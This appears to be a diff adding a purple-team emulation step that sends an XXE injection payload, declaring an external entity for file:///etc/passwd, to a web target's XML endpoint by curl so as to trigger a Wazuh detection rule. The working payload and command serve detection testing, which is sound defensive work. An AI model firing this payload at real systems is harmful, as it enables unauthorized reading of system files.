@@ -1,0 +1,25 @@
+- id: a1190005-0000-4000-8005-000000000005
+  name: T1190 XXE Injection Probe
+  description: >
+    POSTs a minimal XML payload containing an external entity declaration
+    (<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>) to the web
+    target's XML parsing endpoint. Intended to trigger Wazuh rule 100828 (XXE
+    pattern in HTTP request path/body). The request is sent as application/xml;
+    detection fires on the DOCTYPE keyword in the Traefik log.
+  tactic: initial_access
+  technique:
+    attack_id: T1190
+    name: Exploit Public-Facing Application
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -sk -o /dev/null -w "xxe_probe status=%{http_code}\n" \
+            "http://#{app.web_target}/parse" \
+            -X POST \
+            -H "Content-Type: application/xml" \
+            -H "X-Purple-Team-Exercise: phase2-t1190-xxe" \
+            --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' \
+            --max-time 10 2>&1 || true
+        cleanup: |
+          true
